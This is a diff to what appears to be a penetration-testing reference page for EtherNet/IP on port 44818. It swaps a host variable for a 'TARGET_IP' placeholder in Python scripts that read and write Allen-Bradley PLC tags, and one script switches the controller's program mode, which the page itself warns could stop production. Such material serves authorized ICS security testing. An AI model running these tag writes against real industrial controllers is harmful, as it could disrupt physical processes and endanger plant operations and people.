@@ -1,6 +1,7 @@
 # Port 44818 - EtherNet/IP (CIP)
 
 ## Table of Contents
+
 - [Overview](#overview)
 - [Enumeration](#enumeration)
 - [Exploitation](#exploitation)
@@ -15,6 +16,7 @@
 | 2222 | EtherNet/IP | Alternative port |
 
 EtherNet/IP is used by:
+
 - Allen-Bradley/Rockwell PLCs
 - Omron PLCs
 - Industrial automation systems
@@ -62,7 +64,9 @@ run
 #!/usr/bin/env python3
 from pycomm3 import LogixDriver
 
-with LogixDriver('$rhost') as plc:
+target_host = "TARGET_IP"  # Replace with target
+
+with LogixDriver(target_host) as plc:
     # Get PLC info
     print(f"PLC Name: {plc.info}")
     
@@ -82,7 +86,9 @@ with LogixDriver('$rhost') as plc:
 #!/usr/bin/env python3
 from pycomm3 import LogixDriver
 
-with LogixDriver('$rhost') as plc:
+target_host = "TARGET_IP"  # Replace with target
+
+with LogixDriver(target_host) as plc:
     # Write single tag
     plc.write('MyTag', 1337)
     
@@ -99,7 +105,9 @@ with LogixDriver('$rhost') as plc:
 #!/usr/bin/env python3
 from cpppo.server.enip import client
 
-with client.connector(host='$rhost', port=44818) as conn:
+target_host = "TARGET_IP"  # Replace with target
+
+with client.connector(host=target_host, port=44818) as conn:
     # Get identity
     identity, = conn.synchronous(
         conn.list_identity()
@@ -116,7 +124,9 @@ with client.connector(host='$rhost', port=44818) as conn:
 # ⚠️ Extremely dangerous - only for authorized testing!
 from pycomm3 import LogixDriver
 
-with LogixDriver('$rhost') as plc:
+target_host = "TARGET_IP"  # Replace with target
+
+with LogixDriver(target_host) as plc:
     # Change PLC mode (if allowed)
     # This could stop production!
     plc.write('ProgramMode', 1)  # Example tag name
